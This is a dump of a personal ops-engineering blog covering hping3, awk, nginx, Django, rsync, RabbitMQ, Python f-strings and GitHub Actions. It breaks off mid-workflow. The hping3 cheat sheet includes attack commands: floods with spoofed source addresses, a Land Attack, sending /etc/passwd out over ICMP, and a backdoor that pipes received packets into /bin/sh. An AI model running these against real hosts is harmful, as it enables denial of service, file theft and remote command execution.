{"meta":{"title":"hudson's note","subtitle":"Before you can run, you need to be able to walk","description":"HudsonWu's personal blog","author":"Hudson Wu","url":"https://www.gogotech.top","root":"/"},"pages":[{"title":"About","date":"2020-05-09T07:18:34.023Z","updated":"2020-05-09T07:18:34.023Z","comments":true,"path":"about/index.html","permalink":"https://www.gogotech.top/about/index.html","excerpt":"","text":"我的英文名是Hudson Wu，2017年大学毕业，现居深圳，职位是一名运维工程师。大学期间有幸接触到Linux操作系统，产生了很大的兴趣，特喜欢在命令行下执行各种命令，简单高效，还很有逼格。专业是电子商务，对研发体系并没有一个完整系统的认知，但发现了自己在这方面的兴趣，毕业后误打误撞进入了软件测试行业，在做测试的过程中凭借着不错的学习能力掌握了很多技能，特别是运维方面的，也开始意识到运维才是我的天命所在，遂开始了运维工程师的升级之路。 走不完的路，望不尽的天涯。 赞助作者 扫码赞赏方式一 扫码赞赏方式二"}],"posts":[{"title":"hping3, 强大的发包工具","slug":"hping3","date":"2020-05-09T06:18:44.000Z","updated":"2020-05-09T07:18:34.023Z","comments":true,"path":"2020/05/09/hping3/","link":"","permalink":"https://www.gogotech.top/2020/05/09/hping3/","excerpt":"","text":"hping3可以发送自定义TCP/IP数据包，然后像ping一样展示响应。你可以使用hping3实现下面的一些工作： 测试防火墙规则 高级端口扫描 通过协议类型、包大小、服务类型(TOS, type of service)和IP分片来测试网络性能 探测MTU路径 路由跟踪 远程操作系统探测 TCP/IP栈审计 默认情况下，hping3发送TCP headers到目标主机的0端口，winsize设置为64，没有启用任何tcp flag。通常情况下，这是最好的隐藏ping(hide ping)实现方式，一个没有标志(null-flag)的tcp发送到0端口，有很大的可能不会被记录(logged)。 扫描模式： 12345678-0, --rawip, RAW IP mode, 此模式下hping会发送带数据的IP头-1, --icmp, ICMP mode, 发送ICMP echo-request， 可以使用--icmptype和--icmpcode选项配置icmp的type&#x2F;code-2, --udp, UDP mode, 发送udp报文到主机的0端口-8, --scan, Scan mode, 端口扫描，需要接一个指定端口的参数 1,2,3 1-1000 all (代表0-65535) 1-1000,8888 known (&#x2F;etc&#x2F;services定义的端口) !known-9, --listen signature, listen mode, 接收指定的数据 TCP ScansTCP flags12345678-S, --syn flags&#x3D;SYN-A, --ack flags&#x3D;ACK-R, --rst flags&#x3D;RST-F, --fin flags&#x3D;FIN-P, --push flags&#x3D;PUSH-U, --urg flags&#x3D;URG-X, --xmas flags&#x3D;Xmas-Y, --ymas flags&#x3D;Tmas 示例1234567891011121314# -c, 发送包数量# -S, SYN tcp flaghping3 -S 8.8.8.8 -p 80 -c 1# 从80端口开始自增hping3 -S 4.2.2.1 -p ++80 | grep SA# 扫描多个端口hping3 -8 50-56 -S 4.2.2.1# ACKhping3 -A 8.8.8.8 -p 80 -c 1hping3 -F -P -U 8.8.8.8 -p 80 -c 1 hping3使用示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758# udphping3 -2 192.168.1.1 -p 80 -c 1# icmp# -C 13相当于--icmp-ts, timestamp request# -C 17相当于--icmp-addr, address mask requesthping3 -1 192.168.1.1 -C 13# ping失效后的主机检测# -i, --interval, 发送每个包之前等待的时间, 默认为1秒# -i u10000, 等待10000微秒(micro seconds)hping3 -c 4 -n -i 2 192.168.1.1# -Q, --seqnumhping3 192.168.1.103 -Q -p 139 -S# 拦截流量hping3 -9 HTTP -I eth0hping3 -9 &quot;http:&#x2F;&#x2F;www.google.com&#x2F;search?&quot; --beep -I eth0# 文件传输## 接收端hping3 -1 192.168.1.100 -9 signature -I eth0## 发送端, -d, --data, 设置发送包的大小; -E, --file, 使用文件内容填充包数据hping3 -1 192.168.1.101 -e signature -E &#x2F;etc&#x2F;passwd -d 2000# -T, --traceroute, 数据包跟踪# -V, --verbosehping3 -T -V -1 www.baidu.com# --tr-keep-ttl, 不更改ttlhping3 -S 64.233.167.99 -p 80 -T --ttl 15 --tr-keep-ttl -n# firewall&#x2F;ids testinghping3 -S 72.14.207.99 -p 80 --tcp-timestamp# 以Land Attack方式测试目标防火墙# Land Attack时将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10# 小后门hping3 -I eth0 -9 secret | &#x2F;bin&#x2F;shhping3 -R 192.168.1.100 -e secret -E commands_file -d 100 -c 1# --flood, 以泛洪的方式攻击# -a 伪造来源iphping3 -S 192.168.1.1 -a 192.168.1.254 -p 22 --floodhping3 -S 192.168.1.101 -a 192.168.1.101 -k -s 135 -p 135 --floodhping3 -A -S -P -U 66.66.66.66 -k -s 80 -p 80 -a 192.168.1.1# fuzzinghping3 -2 4.2.2.1 -p ++44444 -T -nhping3 -S 4.2.2.1 -p 53 -T# Local Privilege Escalationhping3&gt; id uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)# 主机扫描for addr in $(seq 1 254); do hping3 192.168.1.$addr -c 1 --icmp &amp; done","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.gogotech.top/categories/Linux/"}],"tags":[{"name":"commands","slug":"commands","permalink":"https://www.gogotech.top/tags/commands/"}]},{"title":"awk使用示例","slug":"awk-examples","date":"2020-05-01T14:18:44.000Z","updated":"2020-05-09T07:18:34.023Z","comments":true,"path":"2020/05/01/awk-examples/","link":"","permalink":"https://www.gogotech.top/2020/05/01/awk-examples/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142# 打印大于80个字符的行awk &#39;length($0) &gt; 80&#39; data# 打印最长输入行的长度awk &#39;&#123; if (length($0) &gt; max) max &#x3D; length($0) &#125; END &#123; print max &#125;&#39; data# 打印最长输入行的长度# expand, 将tab转换成空格expand data | awk &#39;&#123; if (x &lt; length($0)) x &#x3D; length($0) &#125; END &#123; print &quot;maximum line length is &quot; x &#125;&#39;# 打印至少有一个字段的行, 可以用来删除空行awk &#39;NF &gt; 0&#39; data# 打印0到100之间的随机7个数字awk &#39;BEGIN &#123; for (i&#x3D;1; i&lt;&#x3D;7; i++) print int(101 * rand()) &#125;&#39;# 计算当前目录所有文件的总大小(bytes)ls -l | awk &#39;&#123; x+&#x3D; $5 &#125; END &#123; print &quot;total bytes: &quot; x &#125;&#39;# 计算当前目录所有文件的总大小(kilobytes)ls -l | awk &#39;&#123; x+&#x3D; $5 &#125; END &#123; print &quot;total K-bytes: &quot;, x &#x2F; 1024 &#125;&#39;# 打印排序后的用户名列表awk -F: &#39;&#123; print $1 &#125;&#39; &#x2F;etc&#x2F;passwd | sort# 打印总行数awk &#39;END &#123; print NR &#125;&#39; data# 打印偶数行awk &#39;NR % 2 &#x3D;&#x3D; 0&#39; data# 根据最后修改时间统计文件ls -l | awk &#39;$6 &#x3D;&#x3D; &quot;Nov&quot; &#123; sum +&#x3D; $5 &#125; END &#123; print sum &#125;&#39;# 统计连接数ss -n | awk &#39;&#x2F;^tcp&#x2F; &#123; ++S[$NF] &#125; END &#123; for (a in S) print a, S[a] &#125;&#39;","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.gogotech.top/categories/Linux/"}],"tags":[{"name":"commands","slug":"commands","permalink":"https://www.gogotech.top/tags/commands/"}]},{"title":"nginx配置技巧","slug":"nginx-tricks","date":"2020-03-10T06:40:44.000Z","updated":"2020-05-09T07:18:34.023Z","comments":true,"path":"2020/03/10/nginx-tricks/","link":"","permalink":"https://www.gogotech.top/2020/03/10/nginx-tricks/","excerpt":"","text":"健康检查12345location &#x2F;healthz &#123; access_log off; return 200 &quot;health\\n&quot;; add_header Content-Type text&#x2F;plain;&#125; 根据二级路径映射不同的服务器1234567891011location &#x2F;path1&#x2F; &#123; proxy_pass http:&#x2F;&#x2F;srv1&#x2F;;&#125;location &#x2F;path2&#x2F; &#123; proxy_pass http:&#x2F;&#x2F;srv2&#x2F;;&#125;location &#x2F; &#123; return 403;&#125; proxy_pass配置的地址尾部有/时，会将请求路径中匹配到location的部分去掉，剩余部分追加到配置地址中。 123location &#x2F;path3 &#123; proxy_pass http:&#x2F;&#x2F;srv3;&#125; proxy_pass配置的地址没有路径时，会将请求路径全部追加到配置地址中。 rewrite的一些用法1234567891011121314151617181920212223242526# 重定向到其他域名rewrite ^(.*)$ https:&#x2F;&#x2F;other.site.server$1 permanent;# 根据二级路径映射不同的路由器 (break)location &#x2F;path1 &#123; rewrite ^&#x2F;path1&#x2F;?(.*)$ &#x2F;$1 break; proxy_pass http:&#x2F;&#x2F;srv1;&#125;# 重写路径 (last, location内)location &#x2F;path1 &#123; rewrite ^&#x2F;path1(.*)$ &#x2F;path2$1 last;&#125;location &#x2F;path2 &#123; proxy_pass http:&#x2F;&#x2F;srv2;&#125;# 重写路径 (location外)location &#x2F;path1 &#123; proxy_pass http:&#x2F;&#x2F;srv1;&#125;location &#x2F;path2 &#123; proxy_pass http:&#x2F;&#x2F;srv2;&#125;rewrite ^&#x2F;path1(.*)$ &#x2F;path2$1 last;# rewrite ^&#x2F;path1(.*)$ &#x2F;path2$1 break;","categories":[{"name":"Others","slug":"Others","permalink":"https://www.gogotech.top/categories/Others/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://www.gogotech.top/tags/nginx/"},{"name":"config","slug":"config","permalink":"https://www.gogotech.top/tags/config/"}]},{"title":"开始使用django","slug":"start-django","date":"2020-03-05T17:28:17.000Z","updated":"2020-05-09T07:18:34.023Z","comments":true,"path":"2020/03/05/start-django/","link":"","permalink":"https://www.gogotech.top/2020/03/05/start-django/","excerpt":"","text":"一个django项目下可以存在多个application，application下可以定义很多的model，一个model会映射到后端数据库的一张表中。这篇文章简单介绍如何如何创建django项目、如何删除所有数据库表以及如何完全删除application。 安装和创建项目12345678910111213# 查看django是否已经安装python3 -m pip show django# 安装指定版本的djangopython3 -m pip install django&#x3D;&#x3D;3.0# 创建项目# 项目创建成功后在settings.py文件正确配置django-admin startproject mysite# 创建app# 创建好后在项目settings.py文件的INSTALLED_APPS中添加appcd mysite &amp;&amp; python3 manage.py startapp app1 models12345678910111213141516# 检查是否有model更新python3 manage.py makemigrationspython3 manage.py makemigrations app1 # 查看指定app# 根据model更新数据库表python3 manage.py migratepython3 manage.py migrate app1 # 生成指定app的数据库表# 创建admin页面的super userpython3 manage.py createsuperuser# 启动web服务# 默认服务器页面http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;# 默认服务器admin页面http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;adminpython3 manage.py runserverpython3 manage.py runserver 0:8088 # 自定义网卡和端口 调试12345678# 查看django版本python3 -m django --version# 执行python命令python3 -c &#39;import channels; print(channels.__version__)&#39;# 打开django shellpython3 manage.py shell 从项目中移除app1 删除数据库中app1对应的表 删除settings.py文件INSTALLED_APPS中的添加的app1 python3 manage.py makemigrations python3 manage.py migrate app1 删除app1文件夹 django项目管理命令1234567# 清空数据库中所有表的数据python3 manage.py flush# 直接清空，不输出提示python3 manage.py flush --noinput# 从fixture中导入数据到数据库python3 manage.py loaddata yourapp&#x2F;fixtures&#x2F;xxx.json /static静态文件在生产环境中建议使用nginx等web服务器另外提供访问，如果想要在Debug设置为False的情况下测试下仍想正常访问/static，可以另外提供目录并配置STATIC_ROOT，或者运行时加上--insecure参数。","categories":[{"name":"Code","slug":"Code","permalink":"https://www.gogotech.top/categories/Code/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.gogotech.top/tags/python/"}]},{"title":"使用scp或者rsync进行文件传输","slug":"scp-and-rsync","date":"2020-03-04T20:42:23.000Z","updated":"2020-05-09T07:18:34.023Z","comments":true,"path":"2020/03/04/scp-and-rsync/","link":"","permalink":"https://www.gogotech.top/2020/03/04/scp-and-rsync/","excerpt":"","text":"rsync(remote sync), 一款非常灵活的网络同步工具，已经在目的地的内容不会进行传输，而且在连接中断的情况下，会重新发出相同的命令来快速恢复。在备份和增量传输方面是一个强大的工具。 scp(secure copy), 基于ssh协议，是一个转储拷贝，完全拷贝内容，适合小文件传输。 使用scp进行文件传输的例子123456# -r, 复制目录下所有文件# -p, 显示预估时间和传输速率# -v, 提供调试信息# -C, 运行过程中压缩文件，节省时间scp -rpv &#x2F;datafile username1@192.168.1.100:&#x2F;home&#x2F;username1scp -Crp &#x2F;datafile username1@192.168.1.100:&#x2F;home&#x2F;username1 使用rsync进行文件传输的例子1234567891011121314151617# -a, 归档模式，递归地复制文件及其文件权限、符号链接等# -z, 传输过程中压缩文件数据# -v, 提供调试信息# -h, human-readable# -e, 定义传输使用的协议# 将目录复制过去rsync -azvh &#x2F;datafile username1@192.168.1.100:&#x2F;home&#x2F;username1# 将目录里的内容复制过去rsync -azvh --progress &#x2F;datafile&#x2F; username1@192.168.1.100:&#x2F;home&#x2F;username1&#x2F;dir1# 指定ssh协议rsync -azvhe &#39;ssh -p 300&#39; &#x2F;datafile username1@192.168.1.100:&#x2F;home&#x2F;username1&#x2F;dir1# 指定要复制的文件rsync -azvh --include &#39;A*&#39; --exclude &#39;*&#39; username1@192.168.1.100:&#x2F;home&#x2F;username1&#x2F;dir1&#x2F; &#x2F;dir2","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.gogotech.top/categories/Linux/"}],"tags":[{"name":"commands","slug":"commands","permalink":"https://www.gogotech.top/tags/commands/"}]},{"title":"rabbitmq一些概念介绍","slug":"rabbitmq","date":"2020-03-02T06:40:44.000Z","updated":"2020-05-09T07:18:34.023Z","comments":true,"path":"2020/03/02/rabbitmq/","link":"","permalink":"https://www.gogotech.top/2020/03/02/rabbitmq/","excerpt":"","text":"rabbitmq是一个消息代理中间件，它接收并转发消息。与现实生活中信件的投递作比较而言，rabbitmq相当于扮演了邮箱、邮局以及快递员的角色。 Producing, 消息的发送方，发送消息的程序是一个producer，后面使用生产者表示 queue, rabbitmq中的“邮箱”（mail box），后面使用队列表示 尽管消息会在rabbitmq和你的应用程序上进行传输，但消息只能存储在queue中 一个queue只受主机的内存和磁盘限制，它本质上是一个大的消息缓冲区 许多Producer可以发送消息到一个队列，许多consumer可以从一个队列接收数据 Consuming, 消息的接收方，主要功能是等待接收消息的程序称为consumer，后面使用消费者表示 exchange，交换器rabbitmq消息传递模型（messaging model）的核心思想是，生产者（producer）从不直接向队列（queue）发送消息，实际上，生产者根本不知道消息是否会被传递到哪个队列中。相反，生产者只能向交换器（exchange）发送消息，交换器做的事情非常简单，一边接收来自生产者的消息，另一边将消息推送到队列中。交换器必须确切地知道如何处理接收到的消息，是添加到一个特定的队列？还是添加到多个队列？或者应该丢弃？这些规则由exchange type定义，可用的取值为：direct, topic, headers, fanout。 default, 消息直接发送到指定队列 fanout, 广播消息给所有与交换器绑定的队列 direct, 消息根据单个条件有选择地发送到与交换器绑定的队列 topic, 根据多个条件有选择地发送到与交换器绑定的队列 The default exchangedefault exchange使用空字符串表示，这个exchange是特殊的，它直接指定消息要发送到哪个队列，队列名在routing_key参数中指定： 12# 生产者代码中配置channel.basic_publish(exchange='', routing_key='hello', body=message) The fanout exchangefanout exchange非常简单，广播所有接收到的消息给所有与它绑定的队列。很适合用来实现日志系统，运行一个接收程序直接把日志打印到文件，同时运行另一个接收程序打印日志到屏幕。 生产者代码： 1234# 创建一个fanout exchange, 命名为logschannel.exchange_declare(exchange='logs', exchange_type='fanout')# 发布消息到logs exchangechannel.basic_publish(exchange='logs', routing_key='', body=message) 消费者代码： 1234567# 创建一个fanout exchange, 命名为logschannel.exchange_declare(exchange='logs', exchange_type='fanout')# 创建一个新的、空的队列，队列名称由服务器自动生成# 配置exclusive为True, 一旦消费端连接关闭，队列将被删除result = channel.queue_declare(queue='', exclusive=True)# 将队列绑定到exchangechannel.queue_bind(exchange='logs', queue=result.method.queue) The direct exchangedirect exchange相对于fanout exchange来说，不是广播消息到所有与它绑定的队列，而是按照消息类别（对消息进行过滤）发送到不同的队列。比如日志系统，根据日志的严重级别过滤消息，运行一个程序打印日志到文件并配置只接收error级别的日志，再运行另一个程序打印日志到屏幕并配置接收所有级别的日志。direct exchange和队列的绑定(bindings)函数要接收一个额外的参数routing_key，使用这个参数配置如何选择消息。 生产者代码： 1234# 创建一个direct exchange, 命名为direct_logschannel.exchange_declare(exchange='direct_logs', exchange_type='direct')# 发布消息channel.basic_publish(exchange='direct_logs', routing_key=severity, body=message) 消费者代码： 1234567channel.exchange_declare(exchange='direct_logs', exchange_type='direct')result = channel.queue_declare(queue='', exclusive=True)for severity in severities: channel.queue_bind(exchange='direct_logs', queue=result.method.queue, routing_key=severity) The topic exchangedirect exchange不能基于多个条件对消息进行过滤，但topic exchange可以。发送给topic exchange的消息配置的routing_key参数不能是任意值，必须是一个以.分隔的单词列表，比如：stock.usd.nyse，该参数值的大小不超过255字节。有两个特殊的取值: #, 可代替0个或多个任意单词 *, 可代替单个任意单词 生产者代码： 1234# 创建一个topic exchange, 命名为topic_logschannel.exchange_declare(exchange='topic_logs', exchange_type='topic')# 发布消息channel.basic_publish(exchange='topic_logs', routing_key=routing_key, body=message) 消费者代码： 12345678channel.exchange_declare(exchange='topic_logs', exchange_type='topic')result = channel.queue_declare(queue='', exclusive=True)for binding_key in binding_keys: channel.queue_bind(exchange='topic_logs', queue=result.method.queue, routing_key=binding_key) 如何确保消息不丢失消息确认 (Message acknowledgment)为了确保消息不被丢失，rabbitmq提供了消息确认功能，consumer发送一个ack告诉rabbitmq消息已经被接收并且处理了，rabbitmq可以删除这条消息了。 如果一个consumer在没有发送ack的情况下下线了（channel被关闭、connection被关闭或TCP连接丢失），rabbitmq将把这条未被确认的消息认为没有被完全处理并重新加入队列，如果有另外的consumers同时在线，这条消息会被快速交付到其他consumer，这样来确保在有consumer下线的情况下，消息不被丢失。 在消费者代码中配置消息确认： 1234567def callback(ch, method, properties, body): print(\" [x] Received %r\" % body) ... print(\" [x] Done\") ch.basic_ack(delivery_tag = method.delivery_tag) # 配置ackchannel.basic_consume(queue='hello', on_message_callback=callback) 在消费者代码中配置关闭消息确认： 1channel.basic_consume(queue='hello', auto_ack=True, on_message_callback=callback) 消息持久化 (Message durability)当rabbitmq服务退出或崩溃了，在没有做任何持久化措施的情况下，队列和消息都将丢失。要确保消息不丢失，需要配置消息和队列的持久化。 首先配置队列的持久化，生产者和消费者代码都要有队列的声明： 1channel.queue_declare(queue='task_queue', durable=True) 然后是生产者代码中消息的持久化配置： 123456channel.basic_publish(exchange='', routing_key=\"task_queue\", body=message, properties=pika.BasicProperties( delivery_mode = 2, //消息持久化 )) 消息调度有多个消费端（consumer）worker时，默认情况下，rabbitmq将按顺序将每个消息发送给下一个使用者，平均每个消费端将得到相同数量的消息。（round-robin dispatching） 因为不同的消息处理时间不同，round-robin这种调度方法容易造成有的worker负载过重的情况，为了解决这个问题，可以使用basic_qos方法，配置同时分配给一个worker的消息数为1。也就是说，在worker处理并确认前一条消息之前，不要向其发送新消息。（Fair dispatch） 12# 消费者代码中配置channel.basic_qos(prefetch_count=1)","categories":[{"name":"Others","slug":"Others","permalink":"https://www.gogotech.top/categories/Others/"}],"tags":[{"name":"idea","slug":"idea","permalink":"https://www.gogotech.top/tags/idea/"}]},{"title":"rabbitmq命令行工具","slug":"rabbitmq-cli","date":"2020-03-02T06:19:44.000Z","updated":"2020-05-09T07:18:34.023Z","comments":true,"path":"2020/03/02/rabbitmq-cli/","link":"","permalink":"https://www.gogotech.top/2020/03/02/rabbitmq-cli/","excerpt":"","text":"rabbitmqctl, 用于服务管理以及一般操作任务 rabbitmq-diagnostics, 用于诊断和健康检查 rabbitmq-plugins, 用于插件管理 rabbitmq-queues, 用于队列上的维护任务，特别是quorum queues rabbitmqadmin, 用于HTTP API的操作任务 常用命令123456789# 查看有多少队列以及每个队列中的消息数(messages)rabbitmqctl list_queues# 自定义显示队列rabbitmqctl list_queues name messages_ready messages_unacknowledged# 列出exchangesrabbitmqctl list_exchanges# 列出现有的exchange和队列的绑定(bindings)rabbitmqctl list_bindings 用户管理12345678910# 列出用户rabbitmqctl list_users# 新建用户rabbitmqctl add_user username passwd# 删除用户rabbitmqctl delete_user username# 修改密码rabbitmqctl change_password username newpasswd# 设置用户角色(tag可以为administrator, monitoring, management)rabbitmqctl set_user_tags username tagname1 tagname2 rabbitmqctlrabbitmqctl是rabbitmq附带的原生cli工具，支持很多操作，主要是管理性质的，包括： 停止节点 访问节点状态、有效配置以及健康检查 虚拟主机管理 用户和权限管理 策略管理 queues、connections、channels、exchanges、consumers查看 集群成员管理 Further reading 官方文档","categories":[{"name":"Others","slug":"Others","permalink":"https://www.gogotech.top/categories/Others/"}],"tags":[{"name":"commands","slug":"commands","permalink":"https://www.gogotech.top/tags/commands/"}]},{"title":"python3中的字符串格式化","slug":"python-stringformat","date":"2020-03-01T12:11:41.000Z","updated":"2020-05-09T07:18:34.023Z","comments":true,"path":"2020/03/01/python-stringformat/","link":"","permalink":"https://www.gogotech.top/2020/03/01/python-stringformat/","excerpt":"","text":"有三种字符串格式化的方式：%-formatting、str.format()（python 2.6引入）、f-strings（python 3.6引入）。 %-formatting这是python语言一开始就支持的格式化方式，这种格式不是很好，因为它很冗长，并且会导致错误，比如没有正确地显示元组或字典，官方不推荐使用。 123&gt;&gt;&gt; name = \"Eric\"&gt;&gt;&gt; \"Hello, %s.\" % name'Hello, Eric.' 插入多个变量： 1234&gt;&gt;&gt; name = \"Eric\"&gt;&gt;&gt; age = 74&gt;&gt;&gt; \"Hello, %s, You are %s.\" % (name, age)'Hello, Eric, You are 74.' 当开始使用多个参数和更长的字符时，代码就会变得不容易阅读了： 1234567&gt;&gt;&gt; first_name = \"Eric\"&gt;&gt;&gt; last_name = \"Idle\"&gt;&gt;&gt; age = 74&gt;&gt;&gt; profession = \"comedian\"&gt;&gt;&gt; affiliation = \"Monty Python\"&gt;&gt;&gt; \"Hello, %s %s. You are a %s. Your were a member of %s.\" % (first_name, last_name, age, profession, affiliation)'Hello, Eric Idle. You are 74. You are a comedian. You were a member of Monty Python.' str.format()str.format()是对%-formatting的该进，它使用普通的函数调用语法，并且可以通过format()方法将对象转换为字符串。 12&gt;&gt;&gt; \"Hello, &#123;&#125;. You are &#123;&#125;.\".format(name, age)'Hello, Eric. Your are 74.' 可以使用索引： 12&gt;&gt;&gt; \"Hello, &#123;1&#125;. You are &#123;0&#125;.\".format(age, name)'Hello, Eric. Your are 74.' 可以使用变量名： 123&gt;&gt;&gt; person = &#123;'name': 'Eric', 'age': 74&#125;&gt;&gt;&gt; \"Hello, &#123;name&#125;. You are &#123;age&#125;.\".format(name=person['name'], age=person['age'])'Hello, Eric. Your are 74.' 字典使用小技巧 - **： 12&gt;&gt;&gt; \"Hello, &#123;name&#125;. You are &#123;age&#125;.\".format(**person)'Hello, Eric. Your are 74.' 使用str.format()比使用%-formatting更容易阅读，但在处理多个参数和更长的字符串时，仍然显得冗长： 12345678910&gt;&gt;&gt; first_name = \"Eric\"&gt;&gt;&gt; last_name = \"Idle\"&gt;&gt;&gt; age = 74&gt;&gt;&gt; profession = \"comedian\"&gt;&gt;&gt; affiliation = \"Monty Python\"&gt;&gt;&gt; print((\"Hello, &#123;first_name&#125; &#123;last_name&#125;. You are &#123;age&#125;. \" + &gt;&gt;&gt; \"You are a &#123;profession&#125;. You were a member of &#123;affiliation&#125;.\") \\&gt;&gt;&gt; .format(first_name=first_name, last_name=last_name, age=age, \\&gt;&gt;&gt; profession=profession, affiliation=affiliation))'Hello, Eric Idle. You are 74. You are a comedian. You were a member of Monty Python.' f-stringsf-strings语法和str.format类似，但更简洁： 123456&gt;&gt;&gt; name = \"Eric\"&gt;&gt;&gt; age = 74&gt;&gt;&gt; f\"Hello, &#123;name&#125;. You are &#123;age&#125;.\"'Hello, Eric. Your are 74.'&gt;&gt;&gt; F\"Hello, &#123;name&#125;. You are &#123;age&#125;.\"'Hello, Eric. Your are 74.' 因为f-strings是在运行时求值的，所以可以再其中放入任何有效的表达式： 12345678910&gt;&gt;&gt; f\"&#123;2 * 37&#125;\"'74'&gt;&gt;&gt; def to_lowercase(input):... return input.lower()&gt;&gt;&gt; name = \"Eric Idle\"&gt;&gt;&gt; f\"&#123;to_lowercase(name)&#125; is funny.\"'eric idle is funny.'&gt;&gt;&gt; f\"&#123;name.lower()&#125; is funny.\"'eric idle is funny.' 还可以使用对象： 123456789class Comedian: def __init__(self, first_name, last_name, age): self.first_name = first_name self.last_name = last_name self.age = age def __str__(self): return f\"&#123;self.first_name&#125; &#123;self.last_name&#125; is &#123;self.age&#125;.\" def __repr__(self): return f\"&#123;self.first_name&#125; &#123;self.last_name&#125; is &#123;self.age&#125;. Surprise!\" 123&gt;&gt;&gt; new_comedian = Comedian(\"Eric\", \"Idle\", \"74)&gt;&gt;&gt; f\"&#123;new_comedian&#125;\"'Eric Idle is 74.' __str__()和__repr__()方法的作用是将对象表示为字符串，在类定义中需要确保至少包含其中一个。由__str__()返回的字符串是对象的非正式字符串表示，应该是可读的，由__repr__()返回的字符串时官方表示，应该是明确的，直接调用str()和repr()比使用__str__()和__repr__()更好。 f-strings默认使用__str__()，可以使用!r转换标志确保使用__repr__()： 12&gt;&gt;&gt; f&quot;&#123;new_comedian!r&#125;&quot;&#39;Eric Idle is 74. Surprise!&#39; 多行字符串12345678910&gt;&gt;&gt; name = \"Eric\"&gt;&gt;&gt; profession = \"comedian\"&gt;&gt;&gt; affiliation = \"Monty Python\"&gt;&gt;&gt; message = (... f\"Hi &#123;name&#125;. \"... f\"You are a &#123;profession&#125;. \"... f\"You were in &#123;affiliation&#125;.\"... )&gt;&gt;&gt; message'Hi Eric. You are a comedian. You were in Monty Python.' 还可以使用\\来多行扩展字符串： 123456&gt;&gt;&gt; message = f\"Hi &#123;name&#125;. \" \\... f\"You are a &#123;profession&#125;. \" \\... f\"You were in &#123;affiliation&#125;.\"...&gt;&gt;&gt; message'Hi Eric. You are a comedian. You were in Monty Python.' 如果使用三引号&quot;&quot;&quot;，可能不一定是你想要的： 12345678&gt;&gt;&gt; message = f\"\"\"... Hi &#123;name&#125;. ... You are a &#123;profession&#125;. ... You were in &#123;affiliation&#125;.... \"\"\"...&gt;&gt;&gt; message'\\n Hi Eric.\\n You are a comedian.\\n You were in Monty Python.\\n' 执行时间f-strings比另外两种方式都更快，f-strings是在运行时计算的表达式，而不是常量值。 12345&gt;&gt;&gt; import timeit&gt;&gt;&gt; timeit.timeit(\"\"\"name = \"Eric\"... age = 74... '%s is %s.' %(name, age)\"\"\", number = 10000)0.0032246080227196217 1234&gt;&gt;&gt; timeit.timeit(\"\"\"name = \"Eric\"... age = 74... '&#123;&#125; is &#123;&#125;.'.format(name, age)\"\"\", number = 10000)0.004390567017253488 1234&gt;&gt;&gt; timeit.timeit(\"\"\"name = \"Eric\"... age = 74... f'&#123;name&#125; is &#123;age&#125;.'\"\"\", number = 10000)0.0022761650034226477 一些细节123456789&gt;&gt;&gt; f\"&#123;'Eric Idle'&#125;\"'Eric Idle'&gt;&gt;&gt; f\"The \\\"comedian\\\" is &#123;name&#125;, aged &#123;age&#125;.\"'The \"comedian\" is Eric Idle, aged 74.'&gt;&gt;&gt; f\"&#123;\\\"Eric Idle\\\"&#125;\" File \"&lt;stdin&gt;\", line 1 f\"&#123;\\\"Eric Idle\\\"&#125;\" ^SyntaxError: f-string expression part cannot include a backslash 123&gt;&gt;&gt; comedian = &#123;'name': 'Eric Idle', 'age': 74&#125;&gt;&gt;&gt; f\"The comedian is &#123;comedian['name']&#125;, aged &#123;comedian['age']&#125;.\"The comedian is Eric Idle, aged 74. 123456&gt;&gt;&gt; f\"&#123;&#123;74&#125;&#125;\"'&#123;74&#125;'&gt;&gt;&gt; f\"&#123;&#123;&#123;74&#125;&#125;&#125;\"'&#123;74&#125;'&gt;&gt;&gt; f\"&#123;&#123;&#123;&#123;74&#125;&#125;&#125;&#125;\"'&#123;&#123;74&#125;&#125;' 一些说明python中有两个内建方法（functions）可以将对象转换成字符串：str和repr，str是更加友好、可读的字符串输出，repr则是包括对象更详细的信息。 123456&gt;&gt;&gt; print(repr('hi'))'hi'&gt;&gt;&gt; print(str('hi'))hi&gt;&gt;&gt; print('hi')hi 123456789101112class Foo: def __init__(self, foo): self.foo = foo def __eq__(self, other): \"\"\"Implements ==.\"\"\" return self.foo == other.foo def __repr__(self): # if you eval the return value of this function, # you'll get another Foo instance that's == to self return \"Foo(%r)\" % self.foo 引用 Python 3’s f-Strings","categories":[{"name":"Code","slug":"Code","permalink":"https://www.gogotech.top/categories/Code/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.gogotech.top/tags/python/"}]},{"title":"Github Actions示例","slug":"github-actions-quickstart","date":"2020-02-29T17:39:22.000Z","updated":"2020-05-09T07:18:34.023Z","comments":true,"path":"2020/02/29/github-actions-quickstart/","link":"","permalink":"https://www.gogotech.top/2020/02/29/github-actions-quickstart/","excerpt":"","text":"在项目根目录创建目录.github/workflows，在这个目录下创建workflow文件。 release.yml： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051name: Release Workflow# on: [push]on: push: tags: - &quot;v*&quot;jobs: test: name: CI Pipeline runs-on: ubuntu-latest steps: - name: Checkout master uses: actions&#x2F;checkout@v2 - name: Set up Ruby 2.6 uses: actions&#x2F;setup-ruby@v1 with: ruby-version: 2.6.x - name: Setup bundler and required gems run: | gem install bundler bundle install --jobs 4 --retry 3 - name: Build and test the websites run: bundle exec rake deploy: name: CD Pipeline PROD needs: test runs-on: ubuntu-latest steps: - name: webfactory&#x2F;ssh-agent uses: webfactory&#x2F;ssh-agent@v0.2.0 with: ssh-private-key: $&#123;&#123; secrets.SSH_PRIVATE_KEY &#125;&#125; - name: Checkout master uses: actions&#x2F;checkout@v2 - name: Setup Ruby 2.6 uses: actions&#x2F;setup-ruby@v1 with: ruby-version: 2.6.x - name: Set up lftp run: sudo apt-get install lftp -y - name: Setup bundler and required gems run: | gem install bundler bundle install --jobs 4 --retry 3 - name: Build and deploy the 